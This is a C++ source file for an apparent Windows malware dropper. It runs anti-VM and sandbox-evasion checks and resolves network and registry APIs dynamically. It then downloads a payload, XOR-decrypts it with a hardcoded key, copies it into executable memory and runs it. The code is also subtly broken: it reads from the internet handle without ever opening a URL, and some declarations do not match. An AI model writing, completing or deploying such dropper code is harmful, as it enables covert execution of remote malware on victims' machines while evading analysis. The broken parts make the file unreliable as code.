#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <unordered_map>
#include <functional>
#include <filesystem>
#include <wininet.h>
#include <tchar.h>
#include <stdexcept>
#include <memory>
#include "anti.h"

// Typedefs for Windows API functions
typedef BOOL(WINAPI* tInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET(WINAPI* tInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD);
typedef BOOL(WINAPI* tInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* tRegCreateKeyExA)(HKEY, LPCSTR, DWORD, LPCSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LONG(WINAPI* tRegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef HANDLE(WINAPI* tCreateMutexA)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
typedef FARPROC(WINAPI* tGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* tGetModuleHandleA)(LPCSTR);

void dropper_logic() {
    // Dynamically load necessary DLLs at runtime
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hAdvapi32 = GetModuleHandleA("advapi32.dll");
    HMODULE hWininet = GetModuleHandleA("wininet.dll");

    if (!hKernel32 || !hAdvapi32 || !hWininet) {
        // Handle error: unable to load DLLs
        return;
    }

    // Get function pointers for dynamically loaded DLLs
    tInternetOpenA pInternetOpenA = (tInternetOpenA)GetProcAddress(hWininet, "InternetOpenA");
    tInternetOpenUrlA pInternetOpenUrlA = (tInternetOpenUrlA)GetProcAddress(hWininet, "InternetOpenUrlA");
    tInternetReadFile pInternetReadFile = (tInternetReadFile)GetProcAddress(hWininet, "InternetReadFile");
    tRegCreateKeyExA pRegCreateKeyExA = (tRegCreateKeyExA)GetProcAddress(hAdvapi32, "RegCreateKeyExA");
    tRegSetValueExA pRegSetValueExA = (tRegSetValueExA)GetProcAddress(hAdvapi32, "RegSetValueExA");
    tCreateMutexA pCreateMutexA = (tCreateMutexA)GetProcAddress(hKernel32, "CreateMutexA");

    if (!pInternetOpenA || !pInternetOpenUrlA || !pInternetReadFile ||
        !pRegCreateKeyExA || !pRegSetValueExA || !pCreateMutexA) {
        // Handle error: unable to get function pointers
        return;
    }

    // Create mutex to ensure only one instance is running
    HANDLE hMutex = pCreateMutexA(NULL, FALSE, "MyMutex");

    if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
        // If another instance is running, exit
        return;
    }

    // Download payload from URL
     HINTERNET hInet = (HINTERNET)pInternetOpenA("MyAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInet == NULL) {
        // Handle error: unable to open internet connection
        CloseHandle(hMutex);
        return;
    }

    // Buffer to read data and vector to hold the payload
    char buffer[1024];
    DWORD bytesRead = 0;
    std::vector<char> payload;

    // Read the payload from the URL into the vector
    while (pInternetReadFile(hInet, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        payload.insert(payload.end(), buffer, buffer + bytesRead);
    }

    // XOR decrypt with hardcoded key
    const char key[] = "S3cr3tK3y!";
    size_t keyLength = strlen(key);
    
    for(size_t i = 0; i < payload.size(); i++) {
        payload[i] ^= key[i % keyLength];
    }
    
    // Write payload to memory
    LPVOID pMemory = VirtualAlloc(NULL, payload.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pMemory) {
        // Handle error: unable to allocate memory
        CloseHandle(hMutex);
        return;
    }

    memcpy(pMemory, payload.data(), payload.size());

    // Execute payload
    typedef void (*tMain)();
    tMain pMain = (tMain)pMemory;
    if (pMain) {
        pMain();
    }

    // Clean up
    VirtualFree(pMemory, 0, MEM_RELEASE);
    InternetCloseHandle(hInet);  // Correctly close hInet (not hFile)
    CloseHandle(hMutex);
}

// Main function
int main() {
    int anomalies = 0;

    // Combine detection methods
    if (multiTimingDetection()) anomalies++;
    if (multiMathDetection()) anomalies++;
    if (tlbFlushDetection()) anomalies++;

    if (anomalies >= DETECTION_THRESHOLD) {
        std::cerr << "Anomaly detected" << std::endl;
        return 1;
    }

    std::cout << "No anomalies detected" << std::endl;

    // Dropper logic    
    try {
        dropper_logic();
    } catch (const AntiVMException& e) {
        std::cerr << "AntiVMException: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
